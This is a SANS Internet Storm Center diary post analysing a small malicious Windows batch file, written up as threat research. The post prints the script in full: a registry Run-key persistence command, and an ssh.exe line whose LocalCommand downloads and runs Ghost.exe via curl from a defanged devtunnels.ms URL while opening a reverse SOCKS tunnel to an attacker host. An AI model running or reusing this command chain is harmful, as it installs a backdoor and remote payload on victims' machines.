---
title: More SSH Fun&#x21;, (Tue, Dec 24th)
url: https://isc.sans.edu/diary/rss/31542
source: SANS Internet Storm Center, InfoCON: green
date: 2024-12-25
fetch_date: 2025-10-06T19:40:17.194748
---

# More SSH Fun&#x21;, (Tue, Dec 24th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31540)
* [next](/diary/31544)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [More SSH Fun!](/forums/diary/More%2BSSH%2BFun/31542/)

**Published**: 2024-12-24. **Last Updated**: 2024-12-24 06:51:08 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/More%2BSSH%2BFun/31542/#comments)

A few days ago, I wrote a diary[[1](https://isc.sans.edu/diary/Christmas%20%22Gift%22%20Delivered%20Through%20SSH/31538)] about a link file that abused the ssh.exe tool present in modern versions of Microsoft Windows. At the end, I mentioned that I will hunt for more SSH-related files/scripts. Guess what? I already found another one.

The script is a Windows batch file (SHA256:3172eb8283a3e82384e006458265b60001ba68c7982fda1b81053705496a999c)[[2](https://www.virustotal.com/gui/file/3172eb8283a3e82384e006458265b60001ba68c7982fda1b81053705496a999c/details)] that has a low Virustotal score. The file is pretty small:

```

@echo off
pushd "%~dp0"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v svchostno2 /t REG_SZ /d "%~dp0start.vbs" /f > nul

C:\Windows\System32\OpenSSH\ssh.exe -o "StrictHostKeyChecking=no" -o "PermitLocalCommand=yes" -o "LocalCommand=curl -L -o %temp%\file1.exe hxxps://vdch79w0-8000[.]inc1[.]devtunnels[.]ms/Ghost.exe && %temp%\file1.exe"  -R 5555 -N -f sozina@64[.]227[.]161[.]158
```

Besides the registry command that implements peristence, the script is a one-liner that will implement a backdoor on the victim's computer. How does it work?

The option "StrictHostKeyChecking=no" instructs SSH to not borrow the victim with host key verification. The option "PermitLocalCommand=yes" instructs SSH to allow execution of a local command after the connection has been established. Yes, you read correctly: you can execute from SSH! The local command is, of course, malicious. It tries to download an executable and launch it.

The SSH paramater "-R 5555" will set up a reverse tunnel from the remote server to the local machine. The normal syntax is "-R [bind\_address:]port:host:hostport" but, when no explicit destination is specified, SSH will act as a SOCKS proxy (like "-D") and forward connections to the destinations requested by the remote SOCKS client! The remaining flags prevent SSH to execute a remote command ("-N") and will put the connection in the backfound ("-f").

Note that the malicious executable is delivered through a devtunnels.ms URL. This domain is a feature ("Dev Tunnels"[[3](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/overview)]) offered primarily through Visual Studio. This allows developers to securely expose localhost ports over the internet so that remote clients can access and test local services during development. This is the Microsoft version of ngrok.

The host is still alive but the "sozina" account is not available, as well as the Dev Tunnel URL. My guess is that Ghost.exe is another RAT.

Merry Christmas!

[1] <https://isc.sans.edu/diary/Christmas%20%22Gift%22%20Delivered%20Through%20SSH/31538>
[2] <https://www.virustotal.com/gui/file/3172eb8283a3e82384e006458265b60001ba68c7982fda1b81053705496a999c/details>
[3] <https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/overview>
[4] <https://ngrok.com>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Proxy](/tag.html?tag=Proxy) [Reverse Shell](/tag.html?tag=Reverse Shell) [SOCKS](/tag.html?tag=SOCKS) [SSH](/tag.html?tag=SSH) [Malware](/tag.html?tag=Malware) [Tunnel](/tag.html?tag=Tunnel)

[0 comment(s)](/diary/More%2BSSH%2BFun/31542/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31540)
* [next](/diary/31544)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)